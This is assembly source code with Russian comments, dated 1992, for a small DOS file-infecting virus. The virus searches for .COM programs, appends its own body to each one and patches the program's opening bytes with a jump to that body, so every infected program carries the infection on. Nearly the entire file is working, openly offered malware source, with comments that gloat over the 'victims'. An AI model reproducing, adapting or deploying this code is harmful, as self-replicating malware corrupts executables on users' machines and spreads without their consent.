; Маленький (или большой) вирус, заражающий .COM-программы
;   при запуске, если у них нету вначале JMP.
; Проверки на всякие всячности не присутствуют.
;
; Copyright (c) 1992, Gogi&Givi International.
;

.model	tiny
.code
	org	0100h
start:
	jmp	virusstart			; Переход на вирус:
	mov	ah,09h				;   также, как будет
	int	21h				;   с жертвой при
	mov	ax,4C00h			;   заражении
	int	21h
	Message	db 'This is little infection... He-he...',13,10,'$'
						; До сих пор нормальный
						;   код жертвы

virusstart:					; А это вирус
        pushf
	push	ax				; Сохраняем все, что
	push	bx				;   только можно...
	push	cx
	push	dx
	push	ds				; Не знаю, насколько
	push	es				;   это правильно...
	push	si
	call	SelfPoint
SelfPoint:                                      ; Определяем точку
        pop     si                              ;   входа

        cld                                     ; Движемся вправо
        push    cs                              ; Поставим сегментные
        pop     ds                              ;   регистры назначения
        push    cs                              ;   и отправления
	pop	es
	mov	di,0100h			; В приемнике - 0100h,
	push	si				;   начало программы
	add	si,original-SelfPoint		; Сейчас SI указывает на
	mov	cx,3				;   оригинальные байты
	rep	movsb				; Скопируем их в начало
	pop	si				;   зараженной программы

	mov	ah,1Ah				; Поставим собственную
	mov	dx,si				;   DTA из конца вируса
	add	dx,VirusDTA-SelfPoint		;   21h прерыванием
	int	21h

	mov	ah,4Eh				; Делаем FindFirst
	mov	dx,si				;   с соответствующей
	add	dx,FileMask-SelfPoint		;   маской
	mov	cx,32				;   и атрибутом чтение/
	int	21h				;   запись, чтобы не
						;   мудрить
	jnc	RepeatOpen			; Ошибок нет - открываем

	jmp	OutVirus			; Низко пошел...

RepeatOpen:
        mov     ax,3D02h                        ; Откроем файл
        mov     dx,si                           ;   при помощи расширенного
        add	dx,NameF-SelfPoint		;   управления оным
	int	21h
	jc	OutVirus			; При всех ошибках выходим

        mov     bx,ax                           ; Возьмем номер файла,
						;   и будем держаться за BX

	mov	ah,3Fh				; Считываем настоящие
	mov	dx,si				;   команды для
	add	dx,Original-SelfPoint		;   исполнения
	mov	cx,3				; Пусть будет три байта
	int	21h
        jc      OutVirus			; Опять проверим на ошибку...
	push	bx
	mov	bx,dx
	cmp	byte ptr [bx],'щ'		; Вдруг в этом файле
	pop	bx				;   тоже сначала переход?
						; 
	je	CloseNotInfect			; Тогда не заражать!
						; Ох, лень мне поточнее
						;   проверять...

	mov	ax,4202h			; Прыгаем в конец
	xor	cx,cx				;   жертвы (изнасилования)
	xor	dx,dx
	int	21h				; Теперь в AX лежит
        jc      OutVirus                        ;   адрес начала
						;   вируса, если нет,
						;   конечно, ошибки
	push	ax

	mov	ah,40h				; Запишем
	mov	dx,si				;   тело вируса
	sub	dx,SelfPoint-VirusStart		;   в файл-жертву
	mov	cx,VirusEnd-VirusStart		; Количество байт
	int	21h

	pop	ax
        jc      OutVirus			; Может случиться ошибка - 
						;   диск, там, переполнен...

        sub     ax,3                            ; Вычитаем 3 - чтобы
        push    bx                              ;   попасть Куда Надо
	mov	bx,si
	sub	bx,SelfPoint-VirusStart
	mov	word ptr cs:[bx+1],ax		; Кладем адрес
	mov	byte ptr [bx],'щ'		; Команда перехода (в
						;   пределах сегмента)
	pop	bx

	mov	ax,4200h			; А теперь в начало
	xor	cx,cx				;   жертвы
	xor	dx,dx
	int	21h
        jc      OutVirus			; Проверка на ошибку

	mov	ah,40h				; И запишем туда
	mov	dx,si				;   команду перехода
	sub	dx,SelfPoint-VirusStart		;   на наше гнусное
	mov	cx,3				;   тело
	int	21h
        jc      OutVirus			; Опять проверим ошибки

	mov	ah,3Eh				; Файл надо закрыть
	int	21h				;   (Он уже заражен -
	jmp	OutVirus			;   больше не работаем)

CloseNotInfect:
	mov	ah,3Eh				; Закрываем неподходящий
	int	21h				;   файл
	
	mov	dx,si
	add	dx,FileMask-SelfPoint		; И делаем FindNext
	mov	ah,4Fh
	int	21h
	jc	OutVirus			; Ошибка - значит, не судьба
	jmp	RepeatOpen			; Или переход на открытие

OutVirus:
	pop	si				; И, конечно же,
	pop	es				;   все на свете
	pop	ds				;   восстановить
	pop	dx
	pop	cx
	pop	bx
	pop	ax
        popf
	mov	si,0100h			; Заносим в стек адрес
	push	si				;   начала программы
	ret					;   и делаем RET

						; Наши данные:

VirusDTA	db 30 dup (0)			; Это DTA
NameF		db 13 dup (0)			; Тут будет имя файла
FileMask	db '*.cOm',(0)			; Вот такая красивая
						;   маска
original:
	mov	dx,offset Message		; А это оригинальные байты
VirusEnd:					;   из жертвы (Лозинский,
						;   не зевай!)
	end	start
